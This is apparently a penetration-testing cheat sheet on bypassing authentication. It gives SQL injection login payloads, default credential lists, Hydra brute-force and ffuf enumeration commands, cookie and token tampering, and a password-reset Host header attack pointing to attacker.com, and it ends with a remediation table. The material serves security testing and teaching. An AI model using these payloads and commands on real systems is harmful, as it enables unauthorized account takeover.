# Authentication Bypass

---

## SQLi Login Bypass

The login query is usually something like:
```sql
SELECT * FROM users WHERE username='INPUT' AND password='INPUT'
```

You inject SQL to make the WHERE clause always true — logging in without valid credentials.

```sql
# Username field — comment out the password check
admin'--
admin'#
admin'/*
' OR 1=1--
' OR '1'='1'--
admin' OR '1'='1
' OR 1=1#

# Both fields
' OR '1'='1
" OR "1"="1
') OR ('1'='1

# If username is known
administrator'--
```

**Burp workflow:**
1. Capture login POST request
2. Send to Repeater
3. Try payloads in username field, leave password as anything
4. Look for redirect to dashboard or different response length

---

## Default Credentials

Try these before anything else — a huge number of real boxes use defaults:

```
admin:admin
admin:password
admin:123456
admin:admin123
admin:(blank)
administrator:administrator
root:root
root:toor
guest:guest
test:test
```

**Service-specific defaults:**

| Service | Username | Password |
|---|---|---|
| Tomcat | tomcat | tomcat, s3cret, password |
| Jenkins | admin | admin, password |
| Grafana | admin | admin |
| WordPress | admin | admin, password |
| phpMyAdmin | root | (blank), root |
| Webmin | admin | admin |
| CUPS | admin | admin |
| Kibana | elastic | changeme |
| GitLab | root | 5iveL!fe, password |

---

## Password Spraying Web Logins (Hydra)

```sh
# HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt <ip> http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# With HTTPS
hydra -l admin -P /usr/share/wordlists/rockyou.txt <ip> https-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# HTTP Basic Auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt <ip> http-get /admin/

# SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<ip>

# FTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<ip>

# RDP
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://<ip>
```

**Finding the failure string** (the `:Invalid credentials` part):
- Try a wrong login manually
- Note what text appears in the response
- Use that exact text in the Hydra command

---

## Cookie/Token Manipulation

```sh
# Decode a JWT token (base64 middle section)
echo "eyJhbGci..." | base64 -d

# Modify role/admin field in Burp → re-encode → replace cookie

# Base64 decode a cookie
echo "dXNlcjE=" | base64 -d    # → user1
echo "YWRtaW4=" | base64 -d    # → admin

# If cookie is just base64 encoded username → encode "admin"
echo -n "admin" | base64       # → YWRtaW4=
# Replace your cookie value with YWRtaW4=
```

---

## Forced Browsing

Some apps check login on the index page but not on sub-pages:

```
# After login, note the admin URL
# Try accessing it without logging in
http://target/admin/dashboard
http://target/admin/users
http://target/panel/
```

---

## Password Reset Flaws

```
# Predictable reset tokens
GET /reset?token=abc123     # try incrementing: abc124, abc125

# Host header injection (reset link goes to attacker)
POST /reset
Host: attacker.com          # reset email will contain link to attacker.com

# Token not invalidated after use — reuse the same reset link
```

---

## Username Enumeration

Different error messages reveal valid usernames:

```
"Invalid username"          → username doesn't exist
"Invalid password"          → username DOES exist, wrong password

# Use this with Burp Intruder or ffuf to enumerate valid usernames
ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&password=wrong" -H "Content-Type: application/x-www-form-urlencoded" -u http://target/login -mr "Invalid password"
```

---

## Remediation

**Root cause:** Authentication failures almost always come from building auth logic from scratch instead of using a proven auth framework, or from misunderstanding what an attacker controls (headers, cookies, tokens).

| Finding | Remediation |
|---|---|
| SQLi login bypass | Use parameterized queries — same fix as SQL injection. The login query must never concatenate user input. See [SQL Injection](sql-injection.md) remediation. |
| Default credentials | Change all default credentials during initial setup. Maintain an inventory of all services and their authentication state. Use a secrets management system. |
| Brute force / no lockout | Implement **account lockout** (e.g., 5 failed attempts → 15 min lockout) or **CAPTCHA** after failed attempts. Rate-limit login endpoints by IP. |
| Cookie/session token is predictable or base64-only | Use cryptographically random session tokens (128-bit minimum). Never encode sensitive values like username/role in a client-side cookie without signing and encrypting them. Use **JWT with RS256** (asymmetric) not HS256 with a weak secret. |
| Forced browsing (missing authorization checks) | Authorization must be checked **server-side on every request**, not just at login. Don't rely on "the user can't find the URL." Implement a centralized authorization middleware. |
| Password reset token predictable or reusable | Use cryptographically random, single-use reset tokens. Expire tokens after 15 minutes. Invalidate the token immediately upon use. |
| Username enumeration | Return **identical error messages** for both invalid username and invalid password (`"Invalid credentials"`). Use consistent response timing to prevent timing-based enumeration. |

**Key point for reports:** Authentication flaws are often chained — enumerate usernames, spray default passwords, bypass with SQLi, escalate via a predictable session token. Report the full attack chain, not just individual findings.
